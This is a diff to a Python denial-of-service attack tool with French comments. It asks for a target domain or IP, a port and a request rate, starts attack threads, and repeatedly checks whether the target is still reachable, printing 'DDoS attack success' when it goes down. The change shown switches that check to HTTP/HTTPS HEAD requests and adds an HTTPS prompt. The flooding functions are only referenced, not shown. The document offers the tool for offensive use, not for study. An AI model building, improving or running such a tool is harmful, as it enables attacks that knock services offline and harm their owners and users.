@@ -3,6 +3,7 @@ import socket
 import threading
 import time
 import sys
+import http.client
 
 # Fonction pour afficher un texte avec un effet de simulation de frappe
 def type_effect(text, delay=0.05, color=None):
@@ -54,15 +55,19 @@ def attack_ip(ip, port, rate):
         time.sleep(1)
 
 # Fonction pour vérifier l'état du serveur
-def check_server(target, port):
+def check_server(target, port, use_https=False):
     global stop_attack
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     while not stop_attack:
         try:
-            sock.connect((target, port))
-            print("Server is up.")
-        except socket.error:
-            print("DDoS attack successs!!!!!!")
+            if use_https:
+                conn = http.client.HTTPSConnection(target, port, timeout=10)
+            else:
+                conn = http.client.HTTPConnection(target, port, timeout=10)
+            conn.request("HEAD", "/")
+            response = conn.getresponse()
+            print(f"Server is up. Status: {response.status}")
+        except (socket.error, http.client.HTTPException) as e:
+            print("DDoS attack success!!!!!!")
             stop_attack = True
         time.sleep(attack_interval)
 
@@ -79,13 +84,14 @@ def start_attack():
     target = input("Enter the target (domain or IP address): ")
     port = int(input("Enter the port: "))
     rate = int(input("Enter the rate (requests per second): "))
+    use_https = input("Use HTTPS? (y/n): ").lower() == 'y'
 
     if target_type == "1":
         attack_thread = threading.Thread(target=attack_domain, args=(target, port, rate))
     else:
         attack_thread = threading.Thread(target=attack_ip, args=(target, port, rate))
 
-    server_check_thread = threading.Thread(target=check_server, args=(target, port))
+    server_check_thread = threading.Thread(target=check_server, args=(target, port, use_https))
 
     attack_thread.start()
     server_check_thread.start()
